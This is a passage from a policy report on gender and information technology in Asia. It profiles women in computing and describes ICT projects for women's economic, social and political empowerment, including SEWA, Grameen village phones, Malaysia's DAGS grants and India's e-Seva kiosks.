just aren’t’ argument, of women not being technically inclined (see Box 4). It is important that this information is shared with a wider audience of women and girls to help reverse the mentality and attitude women generally have towards technology as a result of years of socialization that says ‘technology is a male domain’. As Swasti Mitter expressed in her keynote address at the Global
Knowledge II Women’s Forum in Kuala Lumpur, Malaysia in 2000, “it is not only in the production of
content, but also in the sphere of production of technology that women’s presence is necessary for an
efficient and equitable knowledge society…The prospect of addressing women-specific questions in
the configuration of software remains remote unless women themselves become visible in the
community” (Mitter, 2000).

===Gender Implications in Skills and Capacity Development in Science and Technology===

To some extent, the traditional view that women tend to shy away from technology is becoming less of
a reality as women represent more than 30 percent of university level students in natural sciences in a large number of developing countries across the regions (Hafkin and Taggart, 2001). In Malaysia, for example, women are at least 50 percent of the students in IT courses at public universities (Ng and Yong, 1995).&lt;ref&gt;Also available online at http://www.unu.edu/unupress/unupbooks/uu37we/
uu37we0k.htm#9.%20information%20technology,%20gender%20and%20employment&lt;/ref&gt; In Western Asia, enrollment at most universities is predominantly female. The high percentage of women studying natural sciences, as well as other fields is largely due to the fact that many men are
sent or get to study abroad, while women usually do not have this option.

|'''Augusta Ada King'''

There are five visionaries who changed the face of technology – the unsung Heroes of Computing.
These five includes a woman, Augusta Ada King, Countess of Lovelace (1815-1852). The other four
are Douglas Engelbart (1929- ), Vannever Bush (1890-1974), Alan Turing (1912-1954), and J.C.R.
Licklider (1915-1990).

'''Ada Lovelace, Lady Byron '''

She is credited with the idea for the first computer program. In 1979 a programming language
developed by the US Department of Defence was named in her honour as ‘Ada’.

'''Rear Admiral Grace Hopper of the US Navy '''

As early as 1953, she invented the compiler – the intermediate program that translates English
language instructions into machine language.

'''Esther Dyson'''

She has been hailed as the ‘most influential woman on the Internet’. She was the first interim
chairperson of ICANN and earlier, also the chair of Electronics Frontier Foundation. She has also
written the book Release 2.1.

'''Carleton S. Fiorina'''

She was the President and Chief Executive Officer of Hewlett-Packard Company from 1999 to
2005, and launched the World e-Inclusion programme in October 2000. She also led the Hewlett-
Packard merger with Compaq, which was completed in May 2002.

'''Courtney Houston'''

She is founder and Chief Executive Officer of eHow, a website that provides 15,000 step-by-step
how-to solutions.

'''Pippa Norris'''

She has written Digital Divide: Civic Engagement, Information Poverty, and the Internet Worldwide,
outlining the debate between the cyber optimists (who see Internet as a great leveller) and cyber
pessimists (who see greater inequality emerging) and examining the evidence in 179 countries
worldwide. She is currently the Director of the Democratic Governance Group at the United Nations
Development Programme based in New York.

However, these percentages take a sharp dip when a closer examination of the existing workforce in the area of science and technology, and particularly at jobs that require higher levels of ICT skills. Many of these qualified women opt out due to gender-constructed social obstacles – such as tight labour market and the prevailing preference to give men jobs rather than women, lack of suitable mentors and role models, sexual harassment in the field, and so forth (Henson, 2002). Social expectations for women to get married and stay at home is also a prevalent reason, and the ‘value’ of the woman as a wife can be strongly linked to the level of education obtained.

On the flip side of this coin, it is important to note that a growing number of governments who are
experiencing this phenomenon of having more women studying at the tertiary level and doing much
better than their male colleagues, are thinking of affirmative measures to allow young men to qualify
more easily into universities and to encourage better performance by male enrolees. In this respect,
governments may want to not just examine the numbers, but also ask why young men are not doing
well or studying as hard as they could. If parents are still giving preference to male child education but this time, sending them abroad despite their poorer examination results, it could account for the poor performance locally in schools and at university. In short, is this the result  of the fact that there is no change in how young men and boys are being socialized into society and their perception of what it is to be male, while there is some change in how young women and girls are being socialized into society, and in their perception of what it is to be female? Will our response be to withdraw or reduce the affirmative measures taken in relation to development initiatives for women and girls and start reallocating resources towards affirmative measures for young men and boys? Something to ponder about, no doubt.

==The Odd Couple: Development and Empowerment==
Empowerment refers to enabling people towards self-determination. For women, empowerment
emphasizes the importance of increasing their power and taking control over decisions and issues that
shape their lives. This includes having full access to complete information and to self-discern the quality and credibility of such information in making these decisions. To empower women means to understand and address the various dynamics of power and relationships in a particular society which are intertwined with issues of age, class, culture, ethnicity, gender, history and race. 

Power is identified with equity and equality for women and men in access to resources, participation in decision-making and control over distribution of resources and benefits. Gender equality is addressed at these different levels with the aim of increasing equality between women and men, and achieving women’s empowerment. Access to resources refers to both the means and the right to obtain services, products or commodities. Gender gaps in access to resources and services are a major obstacle to women’s development. The process of empowerment includes mobilizing women to eliminate these gaps. 

Therefore, if development efforts are indeed being implemented within the framework of gender equality, it means that development interventions must ultimately be aimed to empower women.

==Needs vs. Rights Mentality==
Many countries argue that development and the needs of the community must come first, rather than
providing a preferential focus on women’s development needs and their rights. And often, what are
cited are values that put the community first. Hence communal rights must come first before individual rights, making many countries reluctant to place any priority on promoting and protecting women’s rights and autonomy. What many countries have failed to acknowledge, but is open knowledge to
everyone, is the fact that communal rights, once gained, are enjoyed at the individual level. The extent to which these are enjoyed by the wider community depends further on the power hierarchies within that community. This ebb and flow of development priorities and choices, however, have yet to fully integrate a gender perspective that is aimed towards the achievement of women’s empowerment.
Louise Chamberlain in her paper on ‘Considerations for Gender Advocacy vis-à-vis ICT Policy Strategy’
suggests that gender advocates need to take a more pragmatic approach, i.e. in her words, the ‘business case’ approach (Chamberlain, 2002). Chamberlain maintains that gender mainstreaming is revolutionary in many circles and hence, takes too long to attain if a purely rights-based model is used. While she still promotes using arguments of rights, she strongly suggests complementing these with arguments of essential utility. This is not the first time that gender advocates are asked to ‘speak the language’ of policy makers. Such has been what women’s health rights activists have had to do in showing governments that it costs more to ‘heal’ a woman survivor of rape compared to ensuring that proper laws are in place and duly enforced (see Box 5).

!Box 5: A Cost-Benefit Myth of Telecentres
|-
|;'''Myth''': If telecentres have to be economically sustainable, it is not possible to design interventions
for the marginalized, including poor women.
;Fact: New ICTs are remarkably amenable to addressing aggregated demands at the community
level; they are versatile enough to meet not only the diverse needs of various social groups but
also the range of demands of every individual in a community. Successful pilots have demonstrated
that a diversity of models can be adopted to viably address the information and communication
needs of the entire community. Telecentres need not be isolated information stations, but rather
can form part of existing facilities and institutions – health centres, schools, libraries and community centres – that provide a mix of services and potential cost structures based on cross-subsidization.

The fundamental issue in reaching poor women is not one of profitability of models, but the creation
of a set of technology-mediated services and products that allow women to be part of emerging
opportunities. Efficient business models will follow effective technology models. A lopsided focus
on financial viability in discussions around telecentres has resulted in the undermining of a
committed focus on the transformatory and development capabilities of ICTs (Gurumurthy and
Sarkar, 2003).

The private sector does not have the incentive to reach the marginalized and where information
relevant to the marginalized is to any degree delivered by the private sector, the telecentre has
been treated purely as an information shop accessed rarely and randomly by the marginalized
and not as a potential force for change. Governments and NGOs trying to harness ICTs need to
view the economics of telecentres within frameworks of justice and equity. Public information
delivery has to be guided by the cornerstone of accountability rather than of profit. Initial
investments required to set up a telecentre will start paying off when information begins to have
positive influences on the community – in terms of economic well-being as well as transformation
in social relations at community and household levels - as women and the poor start leveraging
information and communication resources.

However, the pragmatic cost-benefit approach places the burden of responsibility and proof on gender
advocates who are not only under-resourced, but do not have access to suitable sex-disaggregated
data. Would it be sufficient for gender advocates to point to examples within other sectors such as health and rural development, which have a longer history of data collection and research, in order to exemplify why gender mainstreaming is important? Would ICT policy makers take any interest if these are not examples pertaining directly to ICT? The fact that gender is cross-cutting should render these examples relevant as any other, yet they are not. Time and again, gender advocates have had to argue as to why gender is important within each and every forum. Governments do have their obligations and responsibilities which they continuously reaffirm of their own free will at various UN conventions and reviews which they are committed or obligated to implement. A more pragmatic approach then may be to design an effective mechanism that will facilitate the various government agencies to actually talk to each other and work together with the national women’s  machineries.&lt;ref&gt;Probably the one and only known successful model of a multi-agency approach is in  the area of violence against women (VAW) and the One Stop Crisis Centre. Women’s rights activists working in the area of VAW have successfully challenged the notion that domestic violence and honour killings are family matters.&lt;/ref&gt; At the least, there must be a mechanism that comprehensively informs all government ministries of the various commitments made at such fora and how these intersect across sectors as well as their implications for policy-making and implementation. However, one unspoken yet often hinted at hurdle may still remain. There is a general innate fear that remains little spoken of or discussed constructively today, that is, if one promotes women’s rights and women’s empowerment too strongly, then that person is deemed a feminist and a man-hater. The fear of feminism probably manifests in different ways. One of which, usually, is in the way most policy makers and development programme planners would differentiate gender issues from women’s issues, and render ‘achievement of equality’ in terms of equal numbers between the sexes and, in doing so, fail to pay due attention to affirmative measures that need to be undertaken to ensure women’s empowerment. It is time to place women’s empowerment back into the framework of gender
equality, where it has always belonged, the way on-the-ground activists have been doing on a smaller
scale.

==Enabling Women’s Empowerment through ICT==
A number of successful initiatives can be cited from all across Asia that demonstrates how women can
acquire ICT-related skills and use the technology, and at the same time have control over their use. In this section, efforts have been made to highlight key initiatives that clearly depict how women can be empowered economically, socially and politically. Considering how women’s needs and issues are so interrelated to one another across these three areas, it is not surprising that these initiatives more often than not address more than one area of women’s empowerment.

===Enabling Women’s Economic Empowerment===
In Asia, a number of credible models exist that could be replicated to address women’s economic issues through the use of ICTs.

The Self Employed Women’s Association (SEWA), for example, has been organizing women in the informal
sector in India since 1972.&lt;ref&gt;As a union, SEWA’s current outreach stands at about 530,000 women members. For more information on SEWA, see http://www.sewa.org&lt;/ref&gt; It was one of the first organizations globally to realize the potential of using ICTs for the productive growth of the informal sector. SEWA is establishing Technology Information Centres in 11 districts of Gujarat, India to provide computer awareness training and basic computer skills for their ‘barefoot managers’, build the capacity of women organizers and leaders, and strengthen their members’ micro enterprises. It now runs programmes that develop women’s abilities in the use of computers, radio, television, video, the telephone, fax machines, mobile phones and satellite communication. Electronic networking is expected to strengthen the connections between the various cooperatives working in different sectors and areas, and currently enables the provision of content tailored to the needs and environment of particular groups of villages. In addition, members of SEWA are able to
access government schemes and tap into new markets. In the second phase, the centres will also support the education of girls.&lt;ref&gt;‘The information technology revolution: Widening or bridging gender gaps’, in International Labour Organization’s World Employment Report 2001. http://www.ilo.org/public/english/support/itcom/&lt;/ref&gt;

The best known of the ICT-enabled businesses with a high percentage of women owners/operators is
Grameen Phones in Bangladesh. The Grameen Bank took a focused approach to gender and development
through their model of poverty reduction, serving as a source of micro-credit and literacy training, skills development, and health, family planning, and political consciousness education directed at women.&lt;ref&gt;Grameen effectively raises consciousness by laying down certain rules of conduct that borrowers are required to follow. These range from boiling water and setting up their own safe household water supply to non-payment of dowry for marriages. Grameen therefore interfered and challenged cultural norms and given power dynamics within the community and the family.&lt;/ref&gt;

In 1996, the Bank set up Grameen Phones, Bangladesh’s first cell phone network. Grameen Phones is
particularly noteworthy because of the economic empowerment that it has brought to poor, largely
uneducated women. From among its more than two million predominantly women borrowers, the Bank
management selects Village Phone Operators to whom the phone is provided as an in-kind loan. The
operators resell wireless phone services (incoming and outgoing) to fellow villagers.

Some 75 percent of the operators are women, numbering about 2,000 (see Box 6).&lt;ref&gt;Twenty-five percent of telephone operators are men, a much larger percentage than their representation in the borrowing population as a whole (5 percent). As the Grameen Bank chooses the village operators, the male management of the Bank made a gender-based decision in selecting a disproportionate number of male operators.&lt;/ref&gt; Having women operators promotes women’s phone usage because women are more likely to use phones when the operator is a woman. Where women were operators, 82 percent of the users were women; with men operators, women comprised only 6.3 percent of Grameen Bank phone users.

More than half of women users (58 percent) said that they preferred women phone operators.&lt;ref&gt;‘Grameen Telecom’s Village Phone Programme: A MultiMedia Case Study’. TeleCommons Development Group. March 2000. http://www.telecommons.com/villagephone/&lt;/ref&gt; The phones are used primarily for calls relating to financial matters, particularly relating to remittances, which are a significant source of village income. Strikingly, among poor villagers, 38 percent of phone users had one or more family members living abroad. The phones are also used to obtain agricultural price information, thereby improving the position of the villagers in bargaining with middlemen and resulting in higher prices for local farm products.

|-
! Box 6: Grameen Bank’s Women Phone Operators
|-
| The Grameen Bank’s women phone operators are generally poorer than the average villager.
However, the income that they earn is significant, generally accounting for 30-40 percent of
household income and averaging US$ 300/year in a country where average per capita income is
US$ 286. The operators are likely to be married (90 percent), and half of them have no formal
education. Another quarter has primary education and the remaining quarter, some secondary
education. Thirty-six percent identify themselves as housewives, and only 6 percent have some
kind of formal employment (in government or business). The women operate their phone businesses while doing household chores or operating another business. Current Village Phone Operators are likely to become managers of the expanded telecommunications services. Village Phones have made women phone clients and phone business operators. They have created a ‘phone culture’ among women by enabling their access to communication tools from which they might otherwise be excluded. They have also shown
that poor, largely uneducated women can master the skills and run a small business. Women phone operators have achieved economic and social empowerment within their households and communities. The relatively substantial revenue stream has elevated the women operators’ positions in their own households, particularly in decision-making. As a result of being a phone operator, better-off villagers come to homes they would ordinarily not frequent, thereby raising the status of the operator. The advantages of small-scale telecommunications businesses for potential women entrepreneurs are that there are no educational requirements, except for minimal mechanical aptitude, and that the capital requirements are small enough to be met through micro-credit schemes. Not only do these businesses provide income and employment for the entrepreneurs – they also accelerate development in areas where telecommunications were scarce or nonexistent.

Governments too have undertaken some initiatives in building up the capacity of women in the area of
ICT, in particular the Korean and Malaysian governments. For example, between 2001 and 2002, the
Ministry of Information and Communication of the Republic of Korea, trained one million housewives in
computer and Internet use. The Ministry of Labour runs computer training for unemployed women,
especially those who are heads of households. The Ministry of Education and Human Resource
Development has a project to enhance ICT skills of girl students from elementary through high school.
The Ministry of Gender Equality has organized programmes at 12 Korean universities for women who
want to work in an e-business or to start Small Office-Home Office businesses. Asian Pacific Women’s
Information Network Center (APWINC) at Sookmyung University trains women to work in IT, including
as freelancers and in their own businesses.

The Ministry of Agriculture and Forestry encourages the use of ICTs by women farmers through onsite
and mobile computer education and technical support services. Real-time information on market prices
is posted on the website. The website also operates a shopping mall for agricultural products. Technical assistance is available to farmers in building personal websites. The Kyonggi Province Programme for women IT professionals (http://www.womenspro.org) provides training and lifelong education for women tailored to the different stages of women’s lives. Unemployed women, women heads of households and handicapped women who want to enter the work force are trained in business incubation and capacity building (including gender training). Women are trained for 10 to 12 months as IT specialists, and at the end of it, they either seek employment or start their own businesses. The course made numerous accommodations to meet women’s needs and daily schedules.

In Malaysia, the Demonstrator Application Grant Scheme (DAGS) proved to be an extremely successful
model that promoted collaborations and project-based partnerships among governmental agencies,
small ICT private sector enterprises, CSOs, as well as the community (see Box 7). Among the 74 projects funded, a number were aimed to benefit women, and included women’s capacity building in the use of ICTs. For example, the project called T-Center For Teleworking and Telecommuting was designed to guide 200 participants, mainly women and youths, to learn and acquire teleworking skills and to enable them to adapt teleworking as a new mode of work. Another project that was funded under the DAGS scheme is the e-Homemakers’ Project (http://ehomemakers.net), the only tri-lingual local portal that promotes the concept of working from home by providing resources and a platform for homemakers and homeworkers to teletrade and tele-exchange. A Women’s Electronic Networking Training (WENT) Award&lt;ref&gt;WENT was an Asia-Pacific regional annual training for women in the use of ICTs, and was a project that was implemented for five years continuously. At the end of those five years, an award was funded by the United Nations Economic and Social Commission for Asia and the Pacific (UNESCAP) as a form of acknowledgement to the most successful WENT graduate who applied her learnings from
WENT for a selected community or within her own organization.&lt;/ref&gt; winner in 2003, this project provides basic ICT skills training to disadvantaged and special women to enable them to participate effectively in this knowledge-based economy. The project prepares them to work at home through other soft skills trainings and empowerment exercises.

! Box 7: Malaysia’s Demonstrator Application Grant Scheme
|-
| DAGS was officially launched in 1998 and was a key initiative for the realization of objectives set
out in Malaysia’s National IT Agenda. Additionally, DAGS enabled all Malaysians the opportunity
to be acculturated and involved in community innovation projects and related activities. The grant
scheme was a platform to build human capacity and capability through ICT applications. Initially,
the Scheme was granted MYR 50 million under the 7th Malaysia Plan, which ended in December
2000. Whilst under the 8th Malaysia Plan (January 2001-December 2005), the amount increased
100 percent to MYR 100 million. DAGS funded a total of 74 projects with total funding of MYR
104.8 million, covering different target communities. The majority of the projects focused on
community development. From these 74 projects, an estimated 1.8 million people from different
target communities benefited from ICT exposure in various ways.

The examples above bring out the following key elements:

*Women are culturally not exposed to establishing and running a business. In fact, in most
countries, trade is generally a male domain as well, and businesses can succeed or fail by whom
you know and do business with. Hence, women will not only lack business management skills
but also business development/marketing skills and a business network. Women should either
be supported (mentored but not made reliant) with the necessary expertise by a third party or
be trained specifically on these skills. For almost all of the examples above, women who are
enabled to run small businesses are almost always provided a ‘captured market’ of peers and
fellow villagers/community members, a small but still necessary start-up niche.
*Grameen’s approach, on the other hand, operates on the notion that the woman knows best on
what she has to do given her situation, capacity and needs. What Grameen spearheaded was a
development approach that placed resources into the hands of poor women and empowered
them with control and decision-making over the use of these. In setting up their system of
accountability among their borrowers, Grameen successfully challenged certain cultural norms
and entrenched gender-power dynamics.

=== Enabling Women’s Social Empowerment ===
Women’s social disempowerment is often strongly linked to her isolation from information that she
needs, and this includes her ability, opportunity and space (both virtual and non-virtual) to communicate in her own local language with others for this information.

In India, Change Initiatives is putting a web-based information system to strategic use for the benefit of poor women of Baduria, a rural region in North-24 Parganas district in the Indian state of West Bengal. 

The project, Nabanna, is a collaboration exercise among Change Initiatives, United Nations Educational, Scientific and Cultural Organization (UNESCO), National Informatics Centre, researchers of the London School of Economics and Queensland University of Technology, and the Baduria Municipality. 

In 2002, concerned over the lack of penetration of ICTs among the rural poor, Change Initiatives found that absence of information and an information-sharing mechanism among poor women have thwarted
their ability to fulfil basic needs, restricted their awareness and blocked their desire to break  barriers that limit their participation in society. The findings were the result of a survey among woman NGOs and self help groups (SHGs) in rural regions of North-24 Parganas.

As a pilot for the project, Change Initiatives decided to work among poor women of the Baduria
Municipality – despite being an urban body, the municipality was to all intents and purposes a rural
region – who were involved in its Community Development Scheme. In its application for the inaugural
Gender and ICT Awards,&lt;ref&gt;The Gender and ICT Awards is a collaborative project between the APC WNSP and the Global Knowledge Partnership (GKP). The inaugural awards ceremony took place in Geneva in conjunction with WSIS in December 2003, where Change Initiatives accepted their award as the winner in the category of ‘Advocacy and Networking’. For more information on Nabanna and other Gender and ICT Award winning projects, visit http://www.genderawards.net&lt;/ref&gt; Change Initiatives shared that, “since Nabanna involves and affects many people, we had to understand many viewpoints in order to formulate plans and track progress. A key feature that distinguishes our project is that it involves people in all four stages of planning, doing, observing and reflecting.”

For Nabanna, Change Initiatives had developed a novel participatory rural appraisal tool where they had asked the candidates to maintain diaries on their lives. The diaries were an effective tool for needs assessment, in addition to being a vehicle for self-expression. Change Initiatives further shared that, “our biggest achievement until now is in instilling a sense of personal empowerment among the beneficiaries by just ensuring greater access to and use of ICTs. We find that our beneficiaries can raise their voice within their family; are respected by their husband, in-laws, parents and other family members; are considered knowledgeable persons in their community (since they learn computers); and have become more creative after learning graphic art software programmes. Many of them said that by learning computers, they would be able to approach the job market with greater confidence. Over and above this, is the emergence of solidarity that has resulted through the correct perception of the ICT centres being spaces reserved exclusively for women. While learning computers, our beneficiaries often discuss their problems, creating a sense of unity among them and also bringing forth the leadership qualities in them. Solidarity outcomes have also been noticed in our review of information group meetings.” WENT&lt;ref&gt;The WENT Workshop, strongly supported by UNESCAP for five consecutive years, was initiated by AWORC. AWORC is an Internet based women’s information network founded in 1999 to develop cooperative approaches and partnerships in increasing access to
and exploring applications of new ICTs for women’s empowerment. The members of AWORC include women’s information, resource and documentation centres; women’s information providers and users; and communications organizations working closely with women’s networks. More information can be found on the network at http://www.aworc.org/index.html&lt;/ref&gt; is one key regional training in the Asia-Pacific region that surprised both project owners and donors. Started in 1999 as a project-based initiative, this regional training continued to be jointly managed by the APC WNSP and APWINC on behalf of AWORC until 2004. WENT began by training women on basic website development tools and other Internet-based group communications in 1999. WENT sought to promote greater networking among women’s organizations in the region and enhance their capabilities on the use of ICTs to advance their social and policy advocacy.

The first WENT workshop trained 23 women from 11 countries to use email and web-based services to
promote and enhance their participation in the review process for the Beijing Platform for Action. In
response to various information and communication needs of women in the Asia-Pacific region, WENT
then diversified its training. Since 2000, WENT ran parallel instructional tracks on web-based information management, local area networking, using ICT for advocacy, and database management. In 2004, instructional tracks focused on e-commerce, content development, and training for ICT trainers. From a workshop designed for women’s organizations in the Asian region by women ICT practitioners, WENT has opened its doors to women and their organizations in the Asia-Pacific region. Women coming from relatively under-represented countries such as Bangladesh, Cambodia, East Timor, Kyrgyzstan, Lao PDR, Russia and Uzbekistan have also graduated from WENT. By 2003, 138 women from 23 countries had
been trained under WENT’s methodology. Since then, WENT has been successfully replicated in Africa
and nationally in the Republic of Korea (1999), the Philippines (2002), Malaysia (2002) and India (2003).

WENT is now being planned for the Pacific and the Middle East and North Africa region. The above examples tell us that in enabling women’s social empowerment, access to ICTs alone is insufficient. Content must match women’s needs in order for ICTs to remain relevant in women’s lives. As needs change, so must content. With WENT, year after year, content evolved to match women’s capacity
building needs as women in the region gained more opportunities and exposure in using ICTs. What Change Initiatives and WENT did was to provide ‘safe spaces’ of communication and exchange that forged women’s solidarity within these spaces. As a result, women strengthened each other in their learning and sharing, knowing that they are no longer alone, no longer isolated. There is an additional dimension to the notion of communication as women’s communication rights is a difficult issue to address purely by ensuring physical availability of ICTs. Access to ICTs alone does not
take into account who controls these resources. If women need permission from their husbands on
exactly when they can turn on/use the radio and the types of radio programmes they can listen to,
having a radio in the household as an indicator of success is extremely misleading. Likewise, the
establishment of community telecentres alone is insufficient to assume that these will impact and serve women and men equally. Women’s heavy workloads and multiple roles that limit their available time to use the telecentre; male attitudes towards women’s use of technology and to women who visit a mixedsex public facility; the lower educational levels of women compared to those of men, and therefore their lack of literacy skills; the lack of relevant content for women in their local languages; and their lack of disposable income for fee-paying centres, are all gender-based factors that constrain women’s use of the telecentres. Availability is not equivalent to access and access is certainly not equivalent to control and decision-making.

=== Enabling Women’s Political Empowerment===

ICTs have been applied as agents of change in enabling women to participate directly in politics and
civic life. The important role provided by ICTs enables an increased opportunity for positive facilitation of public and political participations and rightfully serves as an attempt to replace the traditional form of governance and its accompanying deficiencies with a modern, more open, transparent and responsive service delivery system. As Vikas Nath says, “the new models of governance open up avenues for direct participation of women which so far has been limited to representative forms of participation in which women were insufficiently represented. These models would lead to a more interactive and proactive form of communicating with officials in the local governance spheres in a process which will lead to greater transparency and accountability of their actions. The notion of distance and time would become meaningless as the technologies have the capability of working at all times and from all geographical locations. It also means that women in rural areas for whom time is a scarce commodity and for whom it is absolutely impossible to commute to public offices – the new technologies would enable them to leapfrog to an altogether different platform where they can voice their opinions and communicate to the concerned person without additional burden on their time or commuting large distances.”&lt;ref&gt;Nath, V., ‘Digital Governance: Building and Sustaining Democratic and Accountable Governance Structures using ICT’, p.9. http://www.cddc.vt.edu/digitalgov/gov-menu.html&lt;/ref&gt;

In India, SEWA organizes electronic discussions through the panchayati raj (village governance
institutions). In these discussions, village women often pose questions that are answered promptly by a panel of experts. Through translation modules, responses go to the women in their vernacular language.&lt;ref&gt;Nath, V., ‘Empowerment and Governance: Women’s perspective’, loc. cit., p.7.&lt;/ref&gt;

ICTs are also particularly useful in increasing the transparency and accountability of government, an
application from which women can particularly profit.&lt;ref&gt;There were two dramatic examples from Asia of the role of IT in making governments more transparent and accountable. In response to Internet accounts contradicting the official story, the Prime Minister of China, Zhu Rongji, in a highly unusual action for a Chinese official, publicly recanted the government’s previous position on the cause of a tragic school fire in rural China. In India, photos and a story on the website http://www.tehelka.com exposed high-level bribery and brought the Government into crisis.
Smith, C. S., ‘Chinese Leader Backs Away From Denials in School Blast’, and Dugger, C. W., ‘The Sting That Has India Writhing’, New York Times, pp. 1 &amp; 3, 16 March 2001.&lt;/ref&gt; Two examples demonstrate how women used ICTs to call upon a national government and a local administration for greater accountability and transparency. In 1999 when a devastating cyclone hit south-eastern India killing hundreds of people, women in India found out from the Internet that the scale of the disaster had been made worse by negligence and ill preparedness of the State government disaster mitigation agency. They became active in calling the government into question on this matter. In another incident, when women students in Bangladesh faced administrative inaction in response to increasing instances of campus rape, they publicized their situation on the Internet. The resulting international and national response pressured the university administration to conduct an inquiry.&lt;ref&gt;Nath, V., ‘Empowerment and Governance: Women’s perspective’, loc. cit., pp. 3-5.&lt;/ref&gt;
In the years 1993 to 1994, in the Northwest Frontier Province of Pakistan, the Deutsche Gesellschaft for Technische Zusammerabeit (GTZ) with the Public Health Engineering Department of Pakistan introduced a community-based water and sanitation project that used video technology to effectively address gender issues and include women in the design and planning processes. The project aimed to install tube wells and household latrines, but recognized that women, the main managers and users of water, were excluded from village management and decision-making bodies since no man, foreigner or local, was permitted to meet with them. The Woman to Woman Video project provided women the opportunity to speak across the physical boundaries of the purdah (custom of seclusion), discuss what water and sanitation infrastructure could be afforded and participate in choosing the best water supply option for their households. A camera was used for filming and linked to a portable, car battery-powered monitor for playback, with no editing required (at the time, most villages had intermittent or no electricity supply). 

The project showed that older women would agree to be filmed by women; women rather than male
engineers were the designers, implementers and overseers of construction; women farmers became
motivated to build latrines on discovering they could produce safe agricultural compost after eight
months; and that as a result, women were better able to exert pressure on men to invest money in
household innovations such as the installation of piped water supply (Wickett, 2004).
A project that possibly captures the potential of ICTs in enabling women’s political and civic participation is the e-Seva (e-services) project, which began in the district of West Godavari in Andhra Pradesh, India. The project uses ICTs to provide access to various citizen-to-citizen (C2C) and citizen-to-government (C2G) services to the people living in rural areas. Under this project, web-enabled rural kiosks termed e-Seva centres were established at the mandal (a sub-district unit of administration) level. The unique thing about these centres is that they are run and managed by women SHGs and have been able to position the rural women as information leaders to help bridge the gender divide. 

The e-Seva centres run on a district portal that allows access to various citizen-centric services. These services range from the issuance of various certificates to getting information about various programmes, and also go to the extent of networking citizens and allowing them the flexibility and convenience of mutually beneficial transactions. The project is an effort to strengthen women SHGs in the district, and through them provide citizens access to various government services in a user-friendly and transparent manner. The project offers a host of services to the citizens living in rural areas. The project allows citizens to file their grievances and applications for various government programmes in these centres. Every grievance is acknowledged and transferred online for bringing in field-level action. 

The centres, through the portal, expect to provide a virtual meeting place for citizens to discuss issues relating to the district/villages, its problems and prospective solutions. Citizens can now freely interact with each other to post their ideas. This acts as an online forum for them to share their grievances, air their opinions and trigger the necessary social changes. It also provides opportunity to conduct opinion polls on the important topical issues leading to improved decision-making. The portal, through the kiosks, also enables the administration to pass down important social communications and advocacies for broadcast to the communities.&lt;ref&gt;e-Seva was a Gender and ICT Award winner in 2003 under the category of ‘Capacity Building’. For more information on this project, visit the Gender and ICT Awards website at http://www.genderawards.net&lt;/ref&gt;
It is important to note that while e-governance initiatives are promising, many focus only on administrative efficiency and fail to enable the citizen’s full political participation in consultative and decision-making bodies or mechanisms. This means that at best, such efforts render women as consumers of information and not equal stakeholders in development. At worst, they completely overlook women’s needs and the value of women’s knowledge in public policy and programme implementation. The SEWA model and the Woman to Woman Video project show that ‘giving women voice’&lt;ref&gt;Many development projects tend to boast of ‘giving women voice’ by including consultative mechanisms. But if women have expressed their needs and no concrete and effective action is taken with the women as key stakeholders and actors to address these, it gives the impression that the consultation is nothing more than just a token act.&lt;/ref&gt; alone is not sufficient if there is a
commitment to addressing gender equality. The voice expressed must be heard and responded to with
substantive affirmative action. Otherwise, even e-government services will lose their relevance to women in the long run.

== What are the Challenges in Integrating a Gender Perspective?==

Taking on a gender perspective in any type of initiative is fraught with challenges, both conceptual and
practical, individual and communal. Fully integrating gender analysis means putting on the gender lens,
not selectively, but consistently. This requires viewing all social phenomena from a gender perspective,
probing into hierarchical, unequal and unjust relationships between women and men. At the individual
level, this requires a consciousness on the part of the wearer to continuously challenge socially accepted
roles of women and men that result in harmful health practices or role subordination. This can raise
potentially serious conflicts within the individual.
The individual conflict that is a necessary by-product of becoming aware of gender inequalities extends
to the community level as well. Gender analysis requires communities to probe into existing relationships
among community members towards understanding the inequalities and injustices that exist between
different groups within the community. Community organizers, by and large, hesitate to get into gender
issues precisely because it is seen as having a divisive function that raises conflict within the community.
It is, by far, easier to focus on unifying communities along traditional ways of conduct and roles, rather
than to address existing gender inequalities and concerns.
There are also practical challenges in incorporating a gender perspective. This means allocating time
and resources in understanding basic gender issues as well as applying such concepts into the context
of policies and initiatives. At the community level, this requires a series of gender sensitivity workshops
to prepare communities and individuals to address gender issues and concerns. It may also require the
services of gender specialists to provide necessary advice to development agencies and planners, as
well as gathering resources relevant to different gender issues.

Developing inclusive development strategies with women requires a variety of approaches, or a
combination of these, such as the women’s empowerment approach, the affirmative action approach,&lt;ref&gt;The Convention on the Elimination of All Forms of Discrimination against Women (CEDAW) recognizes variations of historic or past
discrimination and introduces the concept of corrective measures to overcome the effect of past discrimination that leaves women
handicapped vis-á-vis men. For example, if a development initiative is offered to women on the same footing as men, according to the
principle of equal rights or equal opportunity, it might still turn out that men benefit more than women, because men have more
experience, confidence or simply because the environment is male dominated and is more conducive to male participation. This is the
effect of past discrimination. Article 4 provides for measures through which temporary special measures or affirmative action and
women centred development policy measures can be legitimized to ensure de facto equality for women. The Convention goes
beyond the law and obligates governments to implement extra legal measures such as separate programmes or policies for women
to overcome their disadvantage as compared to men. These are provided for in articles 4.1 and 3 of the CEDAW Convention. The
provisions under article 4 has to be enforced to obligate governments to implement policy and programme interventions, even to the
extent of reverse discriminations in order to enable women to access the rights guaranteed in the law.&lt;/ref&gt;
and the Participatory Monitoring and Evaluation (PM&amp;E) approach.&lt;ref&gt;PM&amp;E is a different approach which involves local people, development agencies, and policy makers deciding together how
progress should be measured, and results acted upon. It can reveal valuable lessons and improve accountability. However, it is a
challenging process for all concerned since it encourages people to examine their assumptions about what constitutes progress, and
to face up to the contradictions and conflicts that can emerge. For more information on this approach, please refer to ‘Participatory
Monitoring &amp; Evaluation: Learning from Change’ IDS Policy Briefing, Issue 12, November 1998. http://www.ids.ac.uk/ids/bookshop/
briefs/PB12.pdf&lt;/ref&gt; Consultation with women and
participatory decision-making are not sufficient to ensure that gender issues are considered and addressed in the area of ICT. A high level of consciousness and understanding too is needed to discern the kinds of
gender issues being raised. Do these further perpetuate the gendered division of labour? Do these just
support women in fulfilling their obligatory gendered roles and responsibilities in the household and in
the community? What is usually brought to the surface in such consultations are practical gender needs
rather than strategic gender interests. With the development of trust and a consistent consultative process,
as well as the provision of space for women to come together to discuss these issues, strategic gender
interests can be brought out more clearly and addressed more effectively.
Incorporating gender is an ongoing, never-ending process of conceptualizing, activities, and reconceptualizing.
Once the conscious decision and commitment to take on a gender perspective is made,
development planners and agencies must be prepared for the long haul. This is perhaps the reason why
